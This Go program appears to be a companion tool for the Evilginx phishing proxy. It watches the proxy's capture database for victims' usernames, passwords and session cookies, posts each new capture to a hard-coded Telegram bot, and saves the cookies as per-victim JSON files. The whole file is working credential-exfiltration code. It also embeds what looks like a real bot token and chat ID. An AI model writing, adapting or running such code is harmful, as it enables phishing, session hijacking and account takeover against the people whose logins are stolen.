package main

import (
    "bufio"
    "encoding/json"
    "fmt"
    "log"
    "net/http"
    "net/url"
    "os"
    "time"
)

// STRUCTS -------------------------

type LogLine struct {
    Username string                 `json:"username"`
    Password string                 `json:"password"`
    Tokens   map[string]interface{} `json:"tokens"` // COOKIES
}

// --------------------------------

// Send telegram message
func sendTelegram(botToken, chatID, message string) (string, error) {
    apiURL := "https://api.telegram.org/bot" + botToken + "/sendMessage"

    data := url.Values{}
    data.Set("chat_id", chatID)
    data.Set("text", message)

    resp, err := http.PostForm(apiURL, data)
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()

    var result struct {
        Ok     bool `json:"ok"`
        Result struct {
            MessageID int `json:"message_id"`
        } `json:"result"`
    }

    json.NewDecoder(resp.Body).Decode(&result)
    if result.Ok {
        return fmt.Sprintf("%d", result.Result.MessageID), nil
    }
    return "", nil
}

// Edit message
func editTelegram(botToken, chatID, messageID, newText string) {
    apiURL := "https://api.telegram.org/bot" + botToken + "/editMessageText"

    data := url.Values{}
    data.Set("chat_id", chatID)
    data.Set("message_id", messageID)
    data.Set("text", newText)

    _, err := http.PostForm(apiURL, data)
    if err != nil {
        log.Printf("Failed to edit Telegram message: %v\n", err)
    }
}

// Read last line from a file
func readLastLine(path string) (string, error) {
    file, err := os.Open(path)
    if err != nil {
        return "", err
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    var last string
    for scanner.Scan() {
        last = scanner.Text()
    }

    return last, scanner.Err()
}

// Save cookies JSON
func saveCookies(username string, tokens map[string]interface{}) error {
    if username == "" {
        return nil
    }
    // ensure cookie folder exists
    os.MkdirAll("/root/.evilginx/cookies", 0755)

    filePath := "/root/.evilginx/cookies/" + username + ".json"

    data, _ := json.MarshalIndent(tokens, "", "  ")
    return os.WriteFile(filePath, data, 0644)
}

// MAIN ----------------------------------

func main() {

    botToken := "8471535230:AAFtKZ2V4zkcCW6yTHs1rGrdb9waaiDQzIQ"
    chatID := "7600034451"

    dbPath := "/root/.evilginx/data.db"

    // Track message IDs per username
    messages := make(map[string]string)
    knownPasswords := make(map[string]string)

    fmt.Println("🔥 Evilginx Monitor Started")
    fmt.Println("Watching:", dbPath)
    fmt.Println("----------------------------------------")

    for {
        line, err := readLastLine(dbPath)
        if err != nil {
            time.Sleep(2 * time.Second)
            continue
        }

        if line == "" {
            time.Sleep(2 * time.Second)
            continue
        }

        var logData LogLine
        json.Unmarshal([]byte(line), &logData)

        username := logData.Username
        password := logData.Password

        if username == "" {
            username = "No username"
        }

        // == CREATE TELEGRAM MESSAGE IF NEW USERNAME ==

        if _, exists := messages[username]; !exists {

            msg := fmt.Sprintf("New Visit:\nUsername: %s\nPassword: %s",
                username,
                func() string {
                    if password == "" {
                        return "No password yet"
                    }
                    return password
                }(),
            )

            mid, _ := sendTelegram(botToken, chatID, msg)
            messages[username] = mid
            knownPasswords[username] = password

            // Save cookies immediately if they exist
            if len(logData.Tokens) > 0 {
                saveCookies(username, logData.Tokens)
            }

            fmt.Println("New username →", username)
        }

        // == IF PASSWORD APPEARED LATER → EDIT MESSAGE ==

        if password != "" && knownPasswords[username] == "" {

            newMsg := fmt.Sprintf("New Visit:\nUsername: %s\nPassword: %s",
                username, password)

            editTelegram(botToken, chatID, messages[username], newMsg)

            knownPasswords[username] = password

            fmt.Println("Updated password for:", username)
        }

        // == UPDATE COOKIE FILE ALWAYS WHEN TOKENS APPEAR ==

        if len(logData.Tokens) > 0 {
            saveCookies(username, logData.Tokens)
        }

        time.Sleep(1 * time.Second)
    }
}